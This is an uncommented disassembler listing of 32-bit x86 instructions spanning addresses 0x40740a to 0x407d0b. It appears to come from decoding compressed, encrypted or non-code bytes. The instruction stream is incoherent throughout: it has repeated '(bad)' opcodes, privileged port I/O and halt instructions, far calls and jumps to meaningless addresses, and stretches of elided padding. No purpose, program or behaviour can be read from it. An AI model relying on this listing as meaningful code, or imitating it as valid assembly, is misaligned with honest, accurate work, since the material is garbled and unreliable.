  40740a:	mov    ecx,0x24ffff9b
  40740f:	in     eax,0x66
  407411:	sub    DWORD PTR [ecx+ebx*4-0x1d9000b2],0x98c0fbbf
  40741c:	ror    BYTE PTR [ebx],1
  40741e:	pop    edi
  40741f:	pop    edx
  407420:	call   0x6b9e254d
  407425:	push   edx
  407426:	jp     0x407485
  407428:	add    ecx,DWORD PTR [ebx]
  40742a:	xor    BYTE PTR [eax-0x80],ch
  40742d:	pop    edi
  40742e:	repnz pop ebp
  407430:	add    eax,edi
  407432:	lods   eax,DWORD PTR ds:[esi]
  407433:	test   DWORD PTR [ebx],eax
  407435:	add    al,dh
  407437:	pop    ebp
  407438:	ds inc ebp
  40743a:	sbb    al,0xd8
  40743c:	std    
  40743d:	call   FWORD PTR [edi]
  40743f:	add    eax,DWORD PTR [edx+ebp*2]
  407442:	lock xor eax,DWORD PTR [ebx]
  407445:	push   0xfffffff0
  407447:	loop   0x407408
  407449:	repz mov al,ds:0x7f47fea
  40744f:	rcl    BYTE PTR [ebp+0x50],0xf7
  407453:	xchg   ecx,eax
  407454:	pop    ebx
  407455:	jmp    DWORD PTR [ebp+0xc]
  407458:	imul   esp,DWORD PTR [edx+edi*2],0x60
  40745c:	add    ecx,DWORD PTR [ebx]
  40745e:	mov    al,0x94
  407460:	add    cl,ch
  407462:	adc    al,BYTE PTR [edi]
  407464:	jmp    0x407469
  407466:	lock fidivr WORD PTR [esi]
  407469:	sub    esi,DWORD PTR [ecx]
  40746b:	pop    es
  40746c:	push   ss
  40746d:	rol    BYTE PTR [eax],1
	...
  40747f:	add    bl,ch
  407481:	pop    esi
  407482:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407483:	call   0x847d:0x33724eb7
  40748a:	cmc    
  40748b:	dec    ebp
  40748c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40748d:	dec    esi
  40748e:	cdq    
  40748f:	mov    cl,0x97
  407491:	jnp    0x4074c5
  407493:	push   esi
  407494:	xchg   edi,eax
  407495:	sub    BYTE PTR [esp+edx*2-0x79],0x4e
  40749a:	fiadd  WORD PTR [edi+0x55de3b6d]
  4074a0:	jg     0x407459
  4074a2:	inc    eax
  4074a3:	js     0x407464
  4074a5:	(bad)  
  4074a6:	call   0xb69819ff
  4074ab:	push   ebp
  4074ac:	addr16 dec esi
  4074ae:	cld    
  4074af:	out    0x8,al
  4074b1:	enter  0x6be8,0x66
  4074b5:	xchg   ecx,eax
  4074b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074b7:	push   ebp
  4074b8:	jns    0x40743e
  4074ba:	test   DWORD PTR [ebp+0x47],ecx
  4074bd:	dec    esi
  4074be:	add    eax,DWORD PTR [eax+ecx*8]
  4074c1:	cwde   
  4074c2:	(bad)  
  4074c3:	ret    0x4d37
  4074c6:	cmp    al,0x54
  4074c8:	daa    
  4074c9:	dec    esi
  4074ca:	jle    0x407521
  4074cc:	fstp   st(3)
  4074ce:	mov    edi,0xf9661fc2
  4074d3:	cdq    
  4074d4:	pop    ss
  4074d5:	dec    esi
  4074d6:	jo     0x407557
  4074d8:	sbb    al,0x56
  4074da:	pop    esi
  4074db:	push   ebp
  4074dc:	call   0xe8c7:0xc78cc106
  4074e3:	push   esp
	...
  4074f4:	add    BYTE PTR [eax],al
  4074f6:	cmp    eax,0xef553e57
  4074fb:	dec    ebp
  4074fc:	hlt    
  4074fd:	out    0x18,al
  4074ff:	enter  0xe8ff,0x4b
  407503:	mov    ecx,0x803d2eb9
  407508:	test   DWORD PTR [ecx],edx
  40750a:	cmp    eax,0xf393ff4e
  40750f:	faddp  st(1),st
  407511:	fidiv  WORD PTR [edx+0x1c54fe4d]
  407517:	push   esi
  407518:	inc    DWORD PTR [esi]
  40751a:	inc    ebp
  40751b:	adc    al,0x6d
  40751d:	shl    BYTE PTR [edx+0x79bde74d],1
  407523:	dec    ebp
  407524:	jmp    DWORD PTR [eax+0x17]
  407527:	addr16 mul esi
  40752a:	and    al,0x7c
  40752c:	test   ecx,eax
  40752e:	xor    al,0x4e
  407530:	(bad)  
  407531:	cmp    DWORD PTR [edx+ecx*4+0x4dec2837],ecx
  407538:	mov    ch,0xb9
  40753a:	mov    esp,0xf6beff4d
  40753f:	fld    TBYTE PTR [eax]
  407541:	sub    ah,dh
  407543:	pop    esi
  407544:	adc    DWORD PTR [ebx-0x44],esi
  407547:	dec    ebp
  407548:	or     ebp,DWORD PTR [ecx+0x5c82f83f]
  40754e:	or     edx,DWORD PTR [esi-0x1]
  407551:	xchg   esi,eax
  407552:	aas    
  407553:	ror    BYTE PTR [ecx],cl
  407555:	mov    fs,ebx
  407557:	jge    0x4074de
  407559:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  40756a:	add    BYTE PTR [eax],al
  40756c:	mov    esp,0xf992ff4d
  407571:	inc    ebp
  407572:	test   DWORD PTR [ebp-0x2b00b254],edx
  407578:	repz push es
  40757a:	add    BYTE PTR [ecx+0x5eb6389b],bh
  407580:	pushf  
  407581:	jnp    0x407508
  407583:	cmp    DWORD PTR [ebp+ecx*2-0x5df44601],ebp
  40758a:	aaa    
  40758b:	add    BYTE PTR [eax+0x29b5ff08],bl
  407591:	mov    ebx,0xfd26fffe
  407596:	ins    BYTE PTR es:[edi],dx
  407597:	sub    DWORD PTR [eax+0x50cde808],ecx
  40759d:	mov    bl,0xfe
  40759f:	or     ebx,DWORD PTR [ecx]
  4075a1:	cmp    al,0x12
  4075a3:	and    DWORD PTR [eax+ebx*1],0xfffffff7
  4075a7:	jmp    esi
  4075a9:	dec    ebx
  4075aa:	je     0x4075b6
  4075ac:	div    bh
  4075ae:	mov    es,WORD PTR [ebp-0x14503]
  4075b4:	repnz std 
  4075b6:	mov    BYTE PTR [ebp-0x14503],0x99
  4075bd:	or     BYTE PTR [eax],al
  4075bf:	add    cl,cl
  4075c1:	stos   BYTE PTR es:[edi],al
  4075c2:	lea    esi,[esi-0x427d475a]
  4075c8:	lods   eax,DWORD PTR ds:[esi]
  4075c9:	mov    al,0xfe
  4075cb:	call   FWORD PTR [ecx+0x34]
  4075ce:	add    DWORD PTR ds:[eax],0x0
	...
  4075e2:	in     al,0xe
  4075e4:	idiv   edi
  4075e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4075e7:	add    eax,0x2b33675
  4075ec:	lea    eax,[ebp-0x14f7b]
  4075f2:	or     DWORD PTR [eax-0x47a11b4c],edi
  4075f8:	(bad)  
  4075f9:	call   0x3f9289
  4075fe:	and    cl,al
  407600:	jae    0x40760b
  407602:	call   0xffb7:0xa6f7cc75
  407609:	je     0x407647
  40760b:	mov    ecx,0xb7aee4b4
  407610:	(bad)  
  407611:	call   0x3fe45f
  407616:	lock sbb al,0x89
  407619:	in     al,0xff
  40761b:	mov    esp,0x5df00052
  407620:	add    eax,DWORD PTR [ebx-0xa53e5b]
  407626:	fistp  WORD PTR [ebp-0x29]
  407629:	push   0x73
  40762b:	ficomp DWORD PTR [edi-0x9]
  40762e:	iret   
  40762f:	and    al,0x4
  407631:	je     0x407685
  407633:	loope  0x4075c5
  407635:	call   0x936b01
  40763a:	cmp    al,0x97
  40763c:	fild   DWORD PTR [ecx]
  40763e:	lock hlt 
  407640:	xchg   ecx,eax
  407641:	call   FWORD PTR ds:0xa75b56
	...
  407657:	add    BYTE PTR [edx+0x54],ah
  40765a:	push   edx
  40765b:	call   FWORD PTR [ebp+0x49]
  40765e:	pop    edx
  40765f:	dec    DWORD PTR [edi-0x67f8279c]
  407665:	push   0x347fff95
  40766a:	cwde   
  40766b:	call   0xff92b2ef
  407670:	in     eax,0x55
  407672:	pop    ebx
  407673:	in     eax,dx
  407674:	mov    ds:0xa5ff528c,al
  407679:	mov    eax,ds:0x9c57ff5a
  40767e:	cwde   
  40767f:	in     al,0x47
  407681:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407682:	push   edx
  407683:	(bad)  
  407684:	mov    ebp,0x82ad5b55
  407689:	je     0x4076dd
  40768b:	(bad)  
  40768c:	jge    0x407627
  40768e:	pop    edx
  40768f:	jmp    FWORD PTR [edi]
  407691:	test   al,bl
  407693:	pop    es
  407694:	sbb    dh,dh
  407696:	xchg   ebp,eax
  407697:	call   FWORD PTR [edi]
  407699:	aam    0x97
  40769b:	loopne 0x4076bc
  40769d:	fcom   QWORD PTR [ecx-0x1]
  4076a0:	test   DWORD PTR [esi],eax
  4076a2:	icebp  
  4076a3:	pop    ebx
  4076a4:	inc    ebp
  4076a5:	cwde   
  4076a6:	pop    esi
  4076a7:	push   edx
  4076a8:	call   DWORD PTR [eax+0x4af75a4d]
  4076ae:	inc    ecx
  4076af:	dec    edx
  4076b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4076b1:	dec    edx
  4076b2:	inc    esi
  4076b3:	push   edx
  4076b4:	popf   
  4076b5:	pop    ebx
  4076b6:	ss push edx
  4076b8:	fistp  WORD PTR [edi+0x75]
  4076bb:	cwde   
	...
  4076cc:	add    BYTE PTR [eax],al
  4076ce:	xlat   BYTE PTR ds:[ebx]
  4076cf:	dec    edx
  4076d0:	cs cwde 
  4076d2:	fcom   DWORD PTR [edx+0x26]
  4076d5:	push   edx
  4076d6:	fcomp  DWORD PTR [eax+0x4abf5254]
  4076dc:	pop    esp
  4076dd:	arpl   WORD PTR [edi+0x565b0e4a],di
  4076e3:	xchg   esp,eax
  4076e4:	push   es
  4076e5:	push   edx
  4076e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4076e7:	xchg   esp,eax
  4076e8:	stc    
  4076e9:	pop    ecx
  4076ea:	lahf   
  4076eb:	dec    edx
  4076ec:	add    DWORD PTR [esi+0x5d],ebp
  4076ef:	dec    edx
  4076f0:	out    dx,al
  4076f1:	push   ecx
  4076f2:	xor    eax,0x8594d04f
  4076f7:	dec    edx
  4076f8:	ficom  WORD PTR [ecx+0x5]
  4076fb:	dec    ebx
  4076fc:	shl    DWORD PTR [edi+0x6f],0x7
  407700:	jmp    0xe93fa93f
  407705:	mov    dh,0x7a
  407707:	pop    ebx
  407708:	push   0x48
  40770a:	fs fucomp st(0)
  40770d:	fucom  st(5)
  40770f:	dec    ecx
  407710:	xor    al,0xfc
  407712:	push   edi
  407713:	pushf  
  407714:	pop    ebx
  407715:	push   ecx
  407716:	inc    edi
  407717:	and    BYTE PTR [eax+edx*2],0xc8
  40771b:	push   es
  40771c:	jmp    0xef1fed81
  407721:	sbb    BYTE PTR [ecx-0x20e2eefa],dh
  407727:	(bad)  
  407728:	call   0x3f1c7d
  40772d:	cmp    BYTE PTR [edi],0x30
  407730:	jmp    FWORD PTR [esi+0x0]
	...
  407743:	add    BYTE PTR [edi+0x2bb9f7c3],cl
  407749:	shl    DWORD PTR [esi],cl
  40774b:	test   al,0xf3
  40774d:	fidivr WORD PTR [eax]
  40774f:	push   ds
  407750:	xor    ecx,DWORD PTR [edx-0x2]
  407753:	adc    al,0xcf
  407755:	push   ds
  407756:	inc    ecx
  407757:	jmp    0x3ef824a7
  40775c:	inc    ecx
  40775d:	(bad)  
  40775e:	mov    edi,0x458009bd
  407763:	xor    eax,0x160006ac
  407768:	bound  ecx,QWORD PTR [ecx+0x75]
  40776b:	icebp  
  40776c:	sbb    edx,DWORD PTR [edx+0x4a2116b1]
  407772:	jne    0x407785
  407774:	inc    ecx
  407775:	aam    0xf3
  407777:	push   es
  407778:	mov    edi,0x831ee801
  40777d:	dec    ecx
  40777e:	push   esi
  407780:	mov    esi,0x66d1e855
  407785:	dec    ecx
  407786:	call   DWORD PTR [ecx-0x49]
  407789:	adc    BYTE PTR [ecx-0x17],al
  40778c:	and    ah,dl
  40778e:	pop    es
  40778f:	shl    DWORD PTR [ecx],0x4b
  407792:	dec    esi
  407794:	rcl    bl,0xfb
  407797:	(bad)  
  407798:	ds add eax,ebp
  40779b:	aas    
  40779c:	xchg   BYTE PTR [ecx-0x1],cl
  40779f:	mov    al,ds:0x140002ad
  4077a4:	int    0x5a
  4077a6:	sub    DWORD PTR [ebp+0x0],0x0
	...
  4077b9:	add    BYTE PTR [edi-0xeed0024],dh
  4077bf:	dec    ecx
  4077c0:	jne    0x4077a3
  4077c2:	fwait
  4077c3:	and    al,0xb2
  4077c5:	mov    es,eax
  4077c7:	jg     0x40780e
  4077c9:	add    BYTE PTR [ebp+0x2d],ch
  4077cc:	(bad)  
  4077cd:	jmp    FWORD PTR [esi+0x77]
  4077d0:	push   0xff4456ce
  4077d5:	addr16 arpl si,bp
  4077d8:	inc    eax
  4077d9:	add    BYTE PTR [esi-0x5c17f8d0],cl
  4077df:	sbb    al,0xff
  4077e1:	call   FWORD PTR [esi-0x3b0004d0]
  4077e7:	dec    esp
  4077e8:	out    0x43,eax
  4077ea:	imul   esi,DWORD PTR [edi+0xbc9fe],0x0
  4077f1:	push   ebp
  4077f2:	push   edx
  4077f3:	test   al,0x82
  4077f5:	les    ebx,FWORD PTR ds:0xc969ff2a
  4077fb:	mov    bh,0x74
  4077fd:	or     cl,ah
  4077ff:	fidiv  WORD PTR [eax+0x44ccdeff]
  407805:	cld    
  407806:	jno    0x40780c
  407808:	add    bh,ch
  40780a:	das    
  40780b:	sub    al,0xe3
  40780d:	aaa    
  40780e:	dec    eax
  40780f:	add    al,0x68
  407811:	jmp    0xff3fbd6c
  407816:	add    al,0x4c
  407818:	out    0xaf,eax
  40781a:	mov    al,0xb8
  40781c:	(bad)  
  40781d:	push   0x0
	...
  40782f:	add    BYTE PTR [ecx-0x37c7dad4],cl
  407835:	add    ch,BYTE PTR [eax+0xc]
  407838:	add    DWORD PTR [edx-0x1],eax
  40783b:	(bad)  
  40783c:	sub    BYTE PTR fs:[bx+di+0x49],al
  407841:	lods   al,BYTE PTR ds:[esi]
  407842:	xchg   ebp,eax
  407843:	mov    bh,0x9e
  407845:	mov    eax,0x1f05c00a
  40784a:	push   0xff435102
  40784f:	dec    edi
  407850:	popa   
  407851:	gs mov bh,0xff
  407854:	lock jo 0x40780b
  407857:	addr16 lock pop ebp
  40785a:	pop    esi
  40785b:	mov    esi,0x41177998
  407860:	lock in eax,dx
  407862:	dec    esi
  407863:	jne    0x40784d
  407865:	test   DWORD PTR [edx],ebx
  407867:	(bad)  [edi]
  407869:	fstp   DWORD PTR [ebx+0x56]
  40786c:	cmp    al,0xe1
  40786e:	dec    esi
  40786f:	inc    DWORD PTR [ebp-0x178ab157]
  407875:	lds    edi,FWORD PTR [ecx+esi*4]
  407878:	out    dx,eax
  407879:	mov    eax,0x5decc23c
  40787e:	mov    eax,0x47dccc8a
  407883:	cld    
  407884:	ds imul ebx,ecx,0x4e2f59ff
  40788b:	jne    0x407885
  40788d:	cmc    
  40788e:	fidiv  DWORD PTR [eax+0x457ce8bf]
	...
  4078a4:	add    BYTE PTR [eax],al
  4078a6:	mov    ah,0xe4
  4078a8:	sbb    BYTE PTR [esi-0x74fc6128],al
  4078ae:	in     eax,0xd3
  4078b0:	sbb    eax,DWORD PTR [ecx-0x10]
  4078b3:	fisttp QWORD PTR [esi]
  4078b5:	add    BYTE PTR [eiz*4-0x6137ce25],bl
  4078bc:	add    edx,DWORD PTR [edi-0x68]
  4078bf:	ins    DWORD PTR es:[edi],dx
  4078c0:	test   DWORD PTR [eax],eax
  4078c2:	lock push esp
  4078c4:	inc    ebx
  4078c5:	je     0x407894
  4078c7:	pop    es
  4078c8:	pop    esp
  4078c9:	shr    DWORD PTR [ebp+0x2b684e38],cl
  4078cf:	push   es
  4078d0:	(bad)  
  4078d3:	xor    eax,0x9057b751
  4078d8:	mov    bl,0x67
  4078da:	lock pop ebp
  4078dc:	pop    esi
  4078dd:	mov    esi,0xd8a606a0
  4078e2:	neg    DWORD PTR [esi-0x3d]
  4078e5:	cmp    BYTE PTR [edi],dh
  4078e7:	inc    edi
  4078e8:	sbb    DWORD PTR [edx+0x63],0xf15a8e47
  4078ef:	shr    BYTE PTR [eax+0xd],0xf0
  4078f3:	rol    DWORD PTR [edx-0x56ece43b],1
  4078f9:	mov    WORD PTR [edi],cs
  4078fb:	inc    edi
  4078fc:	outs   dx,BYTE PTR ds:[esi]
  4078fd:	dec    esi
  4078fe:	add    bl,BYTE PTR [eax-0x6e7af8df]
  407904:	pop    esi
  407905:	fdivr  st,st(3)
  407907:	inc    esi
  407908:	fdiv   st(3),st
	...
  40791a:	add    BYTE PTR [eax],al
  40791c:	xlat   BYTE PTR ds:[ebx]
  40791d:	into   
  40791e:	xchg   edi,eax
  40791f:	dec    esi
  407920:	out    0xe6,eax
  407922:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407923:	cmp    al,0xb2
  407925:	or     ebp,ecx
  407927:	mov    eax,0x476a336a
  40792c:	int3   
  40792d:	mov    cl,0xe8
  40792f:	fabs   
  407931:	inc    ebp
  407932:	pushf  
  407933:	sti    
  407934:	xlat   BYTE PTR ds:[ebx]
  407935:	xor    BYTE PTR [ecx+0x4e],bl
  407938:	mov    bh,0x90
  40793a:	lods   al,BYTE PTR ds:[esi]
  40793b:	dec    edi
  40793c:	sbb    BYTE PTR [edi],al
  40793e:	jmp    0xb5efdfa1
  407943:	or     esi,DWORD PTR [ecx]
  407945:	pop    es
  407946:	xchg   ecx,eax
  407947:	(bad)
  40794a:	call   0x14f7e9d
  40794f:	xchg   esp,eax
  407950:	test   al,0x46
  407952:	out    0x4d,al
  407954:	add    eax,0xefd7de43
  407959:	cs jecxz 0x4078ee
  40795c:	outs   dx,DWORD PTR ds:[esi]
  40795d:	inc    esi
  40795e:	mov    al,ds:0x1c06ec42
  407963:	jns    0x4079b1
  407965:	mov    BYTE PTR [ebp+0x465f30],ah
  40796b:	mov    dh,0xcf
  40796d:	retf   
  40796e:	sti    
  40796f:	sbb    DWORD PTR [ebp-0x1859f445],esi
  407975:	mov    bl,0x28
  407977:	sub    ah,ch
  407979:	cs int 0x6c
  40797c:	hlt    
  40797d:	push   es
  40797e:	or     ebp,DWORD PTR [ecx+0x0]
	...
  407990:	add    BYTE PTR [eax],al
  407992:	and    eax,0xf3e8a18b
  407997:	push   es
  407998:	(bad)  
  407999:	and    al,0xa4
  40799b:	push   es
  40799c:	add    cl,ch
  40799e:	repz dec ebp
  4079a0:	inc    ebp
  4079a1:	jne    0x407958
  4079a3:	or     eax,0x4619e900
  4079a8:	imul   ebp,ecx,0xe9694619
  4079ae:	outs   dx,BYTE PTR ds:[esi]
  4079af:	int3   
  4079b0:	repz mov ecx,0x3ef48c66
  4079b6:	sub    eax,0xbf3e5046
  4079bb:	cmp    eax,0x2f3fbcff
  4079c0:	lahf   
  4079c1:	fs in  al,dx
  4079c3:	push   es
  4079c4:	or     ebp,DWORD PTR [ecx]
  4079c6:	cwde   
  4079c7:	or     ch,cl
  4079c9:	test   edx,esi
  4079cb:	push   es
  4079cc:	add    BYTE PTR [ecx-0x16bf1123],al
  4079d2:	xor    al,0xbc
  4079d4:	or     edx,DWORD PTR [ecx]
  4079d6:	xor    bh,BYTE PTR [ebp-0x1]
  4079d9:	(bad)  
  4079da:	arpl   WORD PTR [eax+0x3a7764d0],dx
  4079e0:	imul   esi
  4079e2:	xor    al,0xd7
  4079e4:	push   ecx
  4079e5:	shl    DWORD PTR [ecx+0x7c],1
  4079e8:	(bad)  
  4079e9:	fdivp  st(2),st
  4079eb:	mov    esi,eax
  4079ed:	fidivr WORD PTR [ebp+eax*2+0x4580e1e8]
  4079f4:	inc    DWORD PTR [eax]
	...
  407a06:	add    BYTE PTR [eax],al
  407a08:	ret    
  407a09:	or     ch,BYTE PTR [eax+0x6c]
  407a0c:	icebp  
  407a0d:	dec    ecx
  407a0e:	(bad)  
  407a0f:	dec    ah
  407a11:	fdecstp 
  407a13:	call   DWORD PTR [esi+0x206d34d2]
  407a19:	dec    eax
  407a1a:	jmp    edi
  407a1c:	inc    ecx
  407a1d:	fwait
  407a1e:	(bad)  
  407a1f:	call   DWORD PTR [eax+0x76f7e48c]
  407a25:	shr    BYTE PTR [ecx+0x0],cl
  407a28:	add    DWORD PTR [edi+0x37],esi
  407a2b:	inc    ecx
  407a2c:	or     edx,edx
  407a2e:	mov    ah,0xf0
  407a30:	mov    ss,edx
  407a32:	(bad)  
  407a33:	(bad)  
  407a34:	cmp    al,0x64
  407a36:	sub    BYTE PTR [ecx+0x9],al
  407a39:	loope  0x407a24
  407a3b:	mov    ch,0x96
  407a3d:	ror    BYTE PTR [eax-0x124ca7b],cl
  407a43:	push   DWORD PTR [ebx-0xe9c97f8]
  407a49:	inc    edi
  407a4a:	(bad)  
  407a4b:	(bad)  
  407a4c:	pop    esp
  407a4d:	fdiv   st,st(6)
  407a4f:	inc    DWORD PTR [esi]
  407a51:	shl    DWORD PTR [ebp*2-0x1800b810],cl
  407a58:	add    eax,0x40ffff9d
  407a5d:	(bad)  
  407a5e:	call   0x8d13815a
  407a63:	test   ebp,edx
  407a65:	(bad)  
  407a67:	(bad)  
  407a68:	jns    0x407aca
  407a6a:	je     0x407aa4
	...
  407a7c:	add    BYTE PTR [eax],al
  407a7e:	dec    eax
  407a7f:	or     bh,bh
  407a81:	mov    ch,0x89
  407a83:	fdivr  st,st(6)
  407a85:	call   DWORD PTR [esi-0x37d692e6]
  407a8b:	or     ch,al
  407a8d:	test   eax,0xbfed05c
  407a92:	lock ins DWORD PTR es:[edi],dx
  407a94:	rcr    BYTE PTR [eax],1
  407a96:	jae    0x407a2b
  407a98:	sub    bh,dh
  407a9a:	pop    edi
  407a9b:	dec    ebp
  407a9c:	add    BYTE PTR [ebp+0x0],dh
  407a9f:	test   DWORD PTR [edi+ecx*4],edx
  407aa2:	jne    0x407af2
  407aa4:	push   ebx
  407aa5:	inc    DWORD PTR [edi+0x1e]
  407aa8:	pop    esp
  407aa9:	jbe    0x407a2d
  407aab:	ins    DWORD PTR es:[edi],dx
  407aac:	dec    ebx
  407aad:	jmp    0x407a8b
  407aaf:	cmp    BYTE PTR [ebx+0x74],al
  407ab2:	idiv   ch
  407ab4:	pop    ebx
  407ab5:	push   0x62
  407ab7:	xchg   ebp,eax
  407ab8:	dec    ebx
  407ab9:	(bad)  
  407aba:	jne    0x407a4a
  407abc:	push   ebx
  407abd:	call   DWORD PTR [edi]
  407abf:	pop    ebx
  407ac0:	add    eax,DWORD PTR [eax]
  407ac2:	lock mov al,0x88
  407ac5:	in     al,0xff
  407ac7:	mov    ah,0x4a
  407ac9:	add    BYTE PTR [esp+eax*4-0x22fb427a],al
  407ad0:	dec    edx
  407ad1:	push   eax
  407ad3:	popa   
  407ad4:	mov    ecx,0x52c5a582
  407ad9:	(bad)  
  407ada:	fild   QWORD PTR ds:0x2e4844cf
  407ae0:	add    ebp,edi
	...
  407af2:	add    BYTE PTR [eax],al
  407af4:	mov    ?,esp
  407af6:	rol    BYTE PTR [edi],1
  407af8:	fsubr  st,st(6)
  407afa:	cdq    
  407afb:	(bad)  
  407afc:	mov    edi,0xbfec90ec
  407b01:	and    al,0x4b
  407b03:	jmp    DWORD PTR ds:0x57155b26
  407b09:	adc    al,0x4b
  407b0b:	jmp    DWORD PTR [ebp+0x15]
  407b0e:	push   ebx
  407b0f:	call   DWORD PTR [edi-0x67f82fbc]
  407b15:	xor    al,0x9a
  407b17:	inc    DWORD PTR [edi-0x781b6fcc]
  407b1d:	push   es
  407b1e:	out    0x4a,al
  407b20:	ja     0x407adb
  407b22:	lock pop ebx
  407b24:	imul   esi,DWORD PTR [esi+edx*8+0x4a],0x52c97967
  407b2c:	pop    edi
  407b2d:	inc    ebx
  407b2e:	(bad)  
  407b2f:	shr    bh,1
  407b31:	cs jo  0x407acd
  407b34:	dec    edi
  407b35:	inc    ebx
  407b36:	mov    dh,0x90
  407b38:	dec    esp
  407b39:	cmp    ebp,DWORD PTR [esi+0x5839484a]
  407b3f:	dec    edx
  407b40:	aaa    
  407b41:	inc    ebx
  407b42:	push   esp
  407b43:	push   edi
  407b44:	daa    
  407b45:	inc    ebx
  407b46:	xchg   esi,eax
  407b47:	pop    ebx
  407b48:	sbb    dh,BYTE PTR [ebp-0x72]
  407b4b:	dec    edx
  407b4c:	pop    ds
  407b4d:	jns    0x407ae0
  407b4f:	push   edx
  407b50:	pop    ss
  407b51:	inc    ebx
  407b52:	xchg   ecx,eax
  407b53:	sub    al,BYTE PTR [ecx+0x43]
  407b56:	jbe    0x407ba2
	...
  407b68:	add    BYTE PTR [eax],al
  407b6a:	cmp    eax,0xff4a7636
  407b6f:	sub    eax,0x42f7943d
  407b74:	pop    esi
  407b75:	shl    bh,0x30
  407b78:	(bad)  
  407b79:	dec    ecx
  407b7a:	out    0x42,eax
  407b7c:	dec    esi
  407b7d:	rcr    bl,1
  407b7f:	das    
  407b80:	out    0x7f,eax
  407b82:	lock push es
  407b84:	xor    BYTE PTR [ebp-0x8],al
  407b87:	push   es
  407b88:	pushf  
  407b89:	jle    0x407b5f
  407b8b:	xchg   BYTE PTR ds:0x93074a47,ah
  407b91:	div    BYTE PTR [esi-0x69a40f44]
  407b97:	jno    0x407baf
  407b99:	dec    edx
  407b9a:	jns    0x407b68
  407b9c:	or     al,0xdb
  407b9e:	sbb    al,0xff
  407ba0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ba1:	add    edx,DWORD PTR [edi-0x19a40f44]
  407ba7:	inc    eax
  407ba8:	add    dh,dh
  407baa:	cmp    DWORD PTR [edx+0x75],eax
  407bad:	in     eax,dx
  407bae:	sub    DWORD PTR [edi+eax*1-0x8e7c2f],edi
  407bb5:	fisubr WORD PTR [ebx]
  407bb7:	inc    ebp
  407bb8:	add    al,0xe9
  407bba:	xchg   esi,eax
  407bbb:	(bad)  
  407bbc:	in     al,dx
  407bbd:	push   0xffffffb0
  407bbf:	inc    edx
  407bc0:	push   0xffffffe9
  407bc2:	xor    eax,0x4c34ff16
  407bc7:	sub    dh,BYTE PTR [ebp-0x76be4679]
  407bcd:	and    al,0x0
	...
  407bdf:	add    BYTE PTR [eax-0x67170052],ch
  407be5:	sub    BYTE PTR [eax+0x46],0xfc
  407be9:	(bad)  
  407bea:	inc    DWORD PTR [eax]
  407bec:	(bad)  
  407bed:	inc    BYTE PTR [eax-0x17]
  407bf0:	test   al,0xbb
  407bf2:	pop    es
  407bf3:	xchg   ecx,eax
  407bf4:	das    
  407bf5:	pop    esp
  407bf6:	(bad)  
  407bf7:	jle    0x407bb2
  407bf9:	mov    ebx,0xa3776fb
  407bfe:	call   0xff82d69a
  407c03:	xor    BYTE PTR [esi+0x6cb4000a],ch
  407c09:	xor    eax,DWORD PTR [ecx-0xc5ebd3]
  407c0f:	dec    esi
  407c10:	addr16 int3 
  407c12:	sti    
  407c13:	cdq    
  407c14:	sub    BYTE PTR [ebx+ecx*1+0x28b3ff3e],bh
  407c1b:	test   al,0xf3
  407c1d:	cs cdq 
  407c1f:	push   0xfffffff4
  407c21:	push   es
  407c22:	or     ebp,DWORD PTR [ecx]
  407c24:	mov    ecx,0xf3e8cd8a
  407c29:	push   es
  407c2a:	(bad)  
  407c2b:	lods   al,BYTE PTR ds:[esi]
  407c2c:	cmp    eax,DWORD PTR [edi]
  407c2e:	add    cl,ch
  407c30:	repz dec ecx
  407c32:	inc    ebp
  407c33:	add    BYTE PTR [ebp-0x66fff932],dl
  407c39:	arpl   di,di
  407c3b:	imul   ebx,DWORD PTR [ecx-0x7696009d],0xf444b8
	...
  407c55:	add    BYTE PTR [ecx+0x46f484b9],bh
  407c5b:	into   
  407c5c:	(bad)  
  407c5d:	push   eax
  407c5e:	ds push eax
  407c60:	idiv   edi
  407c62:	(bad)  
  407c63:	into   
  407c64:	out    0x6b,eax
  407c66:	retf   0x5
  407c69:	or     ebx,DWORD PTR [ecx-0x5616fbaf]
  407c6f:	add    al,0x0
  407c71:	add    BYTE PTR [ecx+0x494127ec],dh
  407c77:	into   
  407c78:	je     0x407c86
  407c7a:	cmp    DWORD PTR [edi+0x757effb3],0xc0bcd08a
  407c84:	repz imul DWORD PTR [esi-0x32]
  407c88:	dec    edi
  407c89:	push   edx
  407c8a:	popa   
  407c8b:	dec    edi
  407c8c:	mov    bl,0xff
  407c8e:	jle    0x407c4c
  407c90:	test   al,dh
  407c92:	xchg   dh,cl
  407c94:	(bad)  
  407c95:	call   0x40124f
  407c9a:	pop    esp
  407c9b:	rcl    edi,0xf7
  407c9e:	ds iret 
  407ca0:	dec    edi
  407ca1:	push   0x410c14
  407ca6:	cs xchg ecx,eax
  407ca8:	lock test DWORD PTR [esi],0xac35fecf
  407caf:	sbb    eax,0xff310041
  407cb4:	mov    dl,0xff
  407cb6:	push   cs
  407cb7:	mov    ebp,0xe484
	...
  407ccc:	push   es
  407ccd:	iret   
  407cce:	(bad)  
  407ccf:	push   0xfffffff0
  407cd1:	sub    eax,0x6ed8b2db
  407cd6:	add    edi,edi
  407cd8:	pop    ebp
  407cd9:	ds dec edi
  407cdb:	dec    DWORD PTR [edi-0x2692f2bf]
  407ce1:	outs   dx,BYTE PTR ds:[esi]
  407ce2:	add    ebp,eax
  407ce4:	inc    ecx
  407ce5:	std    
  407ce6:	inc    edi
  407ce7:	jmp    FWORD PTR [ecx-0x4d]
  407cea:	push   edi
  407ceb:	imul   DWORD PTR [edi+0x61]
  407cee:	(bad)  
  407cf0:	iret   
  407cf1:	cdq    
  407cf2:	or     al,0x41
  407cf4:	lock push eax
  407cf6:	xchg   ecx,eax
  407cf7:	lock pop edi
  407cf9:	dec    ecx
  407cfa:	inc    edi
  407cfb:	inc    DWORD PTR ds:0xf0411cd3
  407d01:	inc    ebp
  407d02:	jae    0x407cb7
  407d04:	aas    
  407d05:	jno    0x407d84
  407d07:	test   DWORD PTR [eax-0x5f],ecx
  407d0a:	inc    edi
  407d0b:	(bad)  
